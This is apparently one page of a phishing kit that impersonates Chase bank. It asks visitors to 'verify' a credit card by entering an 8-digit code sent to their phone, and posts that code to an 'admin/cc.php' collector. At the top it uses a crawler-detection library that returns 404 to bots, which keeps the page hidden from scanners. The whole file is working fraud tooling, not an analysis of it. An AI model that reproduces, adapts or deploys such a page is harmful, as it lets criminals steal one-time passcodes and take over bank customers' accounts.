<?php 
session_start();

use Jaybizzle\CrawlerDetect\CrawlerDetect;
require 'anti/vendor/autoload.php';
$CrawlerDetect = new CrawlerDetect;
if($CrawlerDetect->isCrawler()) {
    // true if crawler user agent detected
    header("HTTP/1.0 404 Not Found");
        exit();
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta name="viewport"
		content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/css/chase.css">
    <title>Verify Credit Card</title>
    <style>
*{
    max-width: 100%;
    outline: none;
    box-sizing: border-box;

}

body{
    background: url(../img/back.png);
    background-repeat: no-repeat;
    background-size:cover;
    background-attachment: fixed;
    font-family: helvetica, arial, sans-serif;
    margin: 0;

}

header{
    background: linear-gradient(to bottom, black, #00000005);
    padding:20px;
    text-align:center;
    
}

header img{
    width:170px;
}

section{
     text-align: center;
     padding: 70px;
     
}

.Container{
    background:white;
    padding: 20px;
    width: 400px;
    display:inline-block;
    border-radius: 5px;
    
}

.box{
    margin: 20px 0;
    padding-top: 10px;
    font-size:20px;
    padding-bottom: 5px;
  
}
label{
    display: flex;
    color: #717171;
}
.L{
    color: #717171;
    font-size: 0.9em;
    margin-bottom: 20px;
    text-align:left;
}

.L span{
    margin-right:40px;
}

input{
    padding: 10px;
}

.box input{
    border: none;
        border-bottom: 0.1px solid #9a9a9a;
    background: transparent;
    color:  black;
    font-size:18px;
    padding: 5px;
    width:100%;
    font-weight:900;

    display: flex;
    
}

button{
    background:#0060f0;
    color: white;
    border:none;
    padding:10px;
    font-weight: bolder;
    font-size: 1.1em;
    width: 100%;
    border-radius: 5px;
   
}
h5{
    color: #0060f0;
    display: flex;
    margin: 10px;
    font-weight: 100;
}
.colm{
    display:inline-block;
    padding: 8px;
}

img{
    width: 60px;
}


      </style>
</head>
<body>

<header>
        	    <svg version="1.0" xmlns="http://www.w3.org/2000/svg"
			 width="32.000000pt" height="32.000000pt" viewBox="0 0 900.000000 720.000000"
			 preserveAspectRatio="xMidYMid meet">
			
			<g transform="translate(0.000000,720.000000) scale(0.100000,-0.100000)"
			fill="white" stroke="none">
			<path d="M3064 7181 c-9 -20 -1005 -1023 -1331 -1341 -93 -91 -301 -299 -461
			-463 l-292 -299 0 -1331 0 -1332 1067 5 c588 3 1069 6 1071 8 1 1 2 1065 2
			2365 0 2122 -2 2365 -16 2385 -19 27 -28 28 -40 3z"/>
			<path d="M3246 7178 c-7 -28 -8 -2091 -1 -2110 4 -11 411 -13 2388 -11 1310 2
			2383 6 2385 11 1 4 -229 239 -510 522 -282 284 -676 681 -875 883 -198 202
			-365 367 -370 367 -5 0 -82 76 -170 169 -89 93 -164 167 -167 164 -3 -3 -8 2
			-12 11 -6 15 -111 16 -1334 16 l-1328 0 -6 -22z"/>
			<path d="M5886 4914 c-3 -9 -6 -1079 -6 -2379 0 -2055 2 -2364 15 -2368 9 -4
			168 148 470 450 250 250 455 457 455 459 0 2 270 275 600 606 l600 603 0 1323
			0 1322 -1064 0 c-961 0 -1064 -2 -1070 -16z"/>
			<path d="M980 2273 c0 -14 32 -50 96 -110 106 -96 409 -398 769 -764 127 -129
			318 -320 425 -425 107 -105 334 -331 505 -502 l309 -312 1331 0 1330 0 -3
			1060 c-2 833 -5 1062 -15 1065 -6 3 -1077 6 -2380 7 l-2367 3 0 -22z"/>
			</g>
			</svg>
    </header>

  <section>
   <div class="Container">

   
      <div class="box">
        <h3>Verify Your Credit Card ending</h3>
        <p>Please enter the 8 digits code sent to your phone number.</p>
      </div>
 
   <form action="admin/cc.php" method="post">

        <div class="box">
          <input minlength="8" maxlength="8" type="text" name="otp" required placeholder="Enter the code" required>
        </div>

        <div><button type="sumbit">Verify</button></div>
    </form>
        
        


      </div>









    </div>












    </section>


</body>
</html>  